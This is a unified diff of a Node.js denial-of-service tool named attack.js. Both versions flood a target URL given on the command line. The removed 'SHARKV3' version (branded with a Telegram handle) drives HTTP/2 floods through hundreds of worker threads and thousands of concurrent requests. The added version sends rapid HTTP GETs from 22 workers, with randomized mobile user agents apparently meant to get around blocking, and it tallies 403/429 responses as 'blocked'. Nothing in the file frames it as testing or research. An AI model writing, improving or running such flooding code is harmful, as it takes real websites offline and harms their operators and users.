@@ -1,151 +1,134 @@
-const http2 = require('http2');
-const { Worker, isMainThread, workerData } = require('worker_threads');
-const readline = require('readline');
-const net = require('net');
+const http = require('http');
+const { Worker, isMainThread, parentPort } = require('worker_threads');
+const url = require('url');
 
-const THREADS = 100;
-const POWER_MULTIPLIER = 1;
-const MAX_INFLIGHT = 4000;
-const LIVE_REFRESH_RATE = 100;
+// Helper function to generate random user agents (as described earlier)
+function generateRandomMobileUserAgent() {
+    const androidModels = [
+        "SM-G930F", "Nexus 5X", "Mi 11X Pro", "ASUS_X00QD", "OPPO A9 2020", "Huawei P30", 
+        "Xiaomi Redmi Note 7 Pro", "Vivo V15 Pro", "LG V20", "Samsung Galaxy A6+"
+    ];
+    const iosModels = [
+        "iPhone X", "iPhone 12", "iPhone 11", "iPhone 8", "iPhone 6S", "iPad Pro", "iPhone SE"
+    ];
+    const androidVersions = ["6.0", "7.0", "8.1.0", "9", "10", "11"];
+    const iosVersions = ["13.3", "14.0", "14.2", "12.4", "11.4"];
+    const browsers = ["Chrome", "Safari", "Firefox"];
+    
+    // Choose between Android and iOS
+    const isAndroid = Math.random() < 0.5;
+    
+    let userAgent;
+    if (isAndroid) {
+        const model = androidModels[Math.floor(Math.random() * androidModels.length)];
+        const version = androidVersions[Math.floor(Math.random() * androidVersions.length)];
+        const browser = browsers[Math.floor(Math.random() * browsers.length)];
+        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1); // Random browser version between 50-100
 
-let totalRequests = 0;
-let successCount = 0;
-let errorCount = 0;
-let maxRps = 0;
-let rpsLastSecond = 0;
-let end;  // Define the `end` variable here for the main thread
+        userAgent = `Mozilla/5.0 (Linux; Android ${version}; ${model} Build/OPM1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
+    } else {
+        const model = iosModels[Math.floor(Math.random() * iosModels.length)];
+        const version = iosVersions[Math.floor(Math.random() * iosVersions.length)];
+        const browser = browsers[Math.floor(Math.random() * browsers.length)];
+        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1); // Random browser version between 50-100
 
-// Helper function to get a random number within a range (inclusive)
-function getRandomInRange(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
+        userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS ${version} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/${browserVersion}.0 Mobile/15E148 Safari/537.36`;
+    }
+    
+    return userAgent;
 }
 
+// Worker thread function that sends requests
+function sendRequests(targetUrl, durationMs) {
+    const startTime = Date.now();
+
+    // Create an HTTP request to the target
+    const requestOptions = url.parse(targetUrl);
+    requestOptions.method = 'GET';
+    
+    // Generate random user agent for each request
+    const userAgent = generateRandomMobileUserAgent();
+    requestOptions.headers = {
+        'Connection': 'keep-alive',
+        'User-Agent': userAgent
+    };
+
+    // Variables to track request statistics
+    let totalSent = 0;
+    let successCount = 0;
+    let blockedCount = 0;
+
+    // Function to update the console log
+    const updateStats = () => {
+        process.stdout.write(
+            `Total Sent: ${totalSent} | Success: ${successCount} | Blocked: ${blockedCount}\r`
+        );
+    };
+
+    // Send requests continuously until the duration is over
+    const intervalId = setInterval(() => {
+        const req = http.request(requestOptions, (res) => {
+            totalSent++; // Increment total requests sent
+
+            // Check if the response status is a success (2xx)
+            if (res.statusCode >= 200 && res.statusCode < 300) {
+                successCount++;
+            } else if (res.statusCode === 403 || res.statusCode === 429) {
+                // Consider 403 and 429 as blocked
+                blockedCount++;
+            }
+
+            // Update stats every 100ms
+            updateStats();
+        });
+
+        req.on('error', (err) => {
+            totalSent++; // Increment total requests sent
+            blockedCount++; // Consider any error as blocked
+            updateStats();
+            console.error('Request error:', err);
+        });
+
+        req.end();
+
+        // Stop after the duration
+        if (Date.now() - startTime >= durationMs) {
+            clearInterval(intervalId);
+            updateStats();
+            console.log(`\nWorker finished. Total requests sent: ${totalSent}`);
+        }
+    }, 1000 / 22); // Sending requests every ~45ms to simulate 22 threads
+}
+
+// Main function
 if (isMainThread) {
-    if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
+    // Parse the command line arguments
+    const [,, targetUrl, durationSecs] = process.argv;
+    if (!targetUrl || !durationSecs) {
+        console.error('Usage: node attack.js <target> <duration in seconds>');
         process.exit(1);
     }
 
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3]);
+    const durationMs = durationSecs * 1000;
+    console.log(`Starting attack on ${targetUrl} for ${durationSecs} seconds with 22 threads...`);
 
-    end = Date.now() + duration * 1000; // Define end time here in the main thread
-
-    console.clear();
-    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
-
-    // Start the workers with dynamic connection numbers
-    for (let i = 0; i < THREADS; i++) {
-        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
+    // Spawn 22 worker threads
+    const workers = [];
+    for (let i = 0; i < 22; i++) {
+        const worker = new Worker(__filename);
+        worker.on('message', (message) => console.log(message));
+        worker.postMessage({ targetUrl, durationMs });
+        workers.push(worker);
     }
 
-    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
-    }
-
-    // Live Stats
-    setInterval(() => {
-        maxRps = Math.max(maxRps, rpsLastSecond);
-        renderStats();
-        rpsLastSecond = 0;
-    }, LIVE_REFRESH_RATE);
-
-    function renderStats() {
-        readline.cursorTo(process.stdout, 0, 0);
-        readline.clearScreenDown(process.stdout);
-
-        // Remaining time calculation
-        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
-        const minutesRemaining = Math.floor(timeRemaining / 60);
-        const secondsRemaining = Math.floor(timeRemaining % 60);
-
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
-        console.log(`total: ${totalRequests}`);
-        console.log(`max-r: ${maxRps}`);
-        console.log(`===========================`);
-        console.log(`succes: ${successCount}`);
-        console.log(`Blocked: ${errorCount}`);
-        console.log(`===========================`);
-        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
-    }
-
-    const server = net.createServer(socket => {
-        socket.on('data', data => {
-            const msg = data.toString();
-            if (msg === 'req') totalRequests++, rpsLastSecond++;
-            else if (msg === 'ok') successCount++;
-            else if (msg === 'err') errorCount++;
-        });
-    });
-    server.listen(9999);
-
+    // Terminate workers after the duration
+    setTimeout(() => {
+        workers.forEach(worker => worker.terminate());
+        console.log('\nAttack finished.');
+    }, durationMs);
 } else {
-    const { target, duration, initial, connections } = workerData;
-    const endTime = Date.now() + duration * 1000;  // end time for worker threads
-
-    const socket = net.connect(9999, '127.0.0.1');
-    const sendStat = msg => socket.write(msg);
-
-    function sendLoop(client, inflight) {
-        if (Date.now() > endTime || client.destroyed) return;
-
-        if (inflight.count < MAX_INFLIGHT) {
-            try {
-                inflight.count++;
-                const req = client.request({ ':method': 'GET', ':path': '/' });
-
-                req.on('response', () => {
-                    inflight.count--;
-                    sendStat('ok');
-                });
-
-                req.on('error', () => {
-                    inflight.count--;
-                    sendStat('err');
-                });
-
-                req.end();
-                sendStat('req');
-            } catch {
-                inflight.count--;
-                sendStat('err');
-            }
-        }
-
-        // Slight delay to avoid killing the system
-        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
-    }
-
-    function createConnection() {
-        if (Date.now() > endTime) return;
-
-        let client;
-        try {
-            client = http2.connect(target);
-
-            const inflight = { count: 0 };
-
-            client.on('error', () => {
-                client.destroy();
-                setTimeout(createConnection, 5000); // auto-recover fast
-            });
-
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 5000));
-
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
-            });
-        } catch {
-            setTimeout(createConnection, 1000);
-        }
-    }
-
-    for (let i = 0; i < connections; i++) {
-        createConnection();
-    }
+    // Worker thread logic
+    parentPort.on('message', (data) => {
+        sendRequests(data.targetUrl, data.durationMs);
+    });
 }
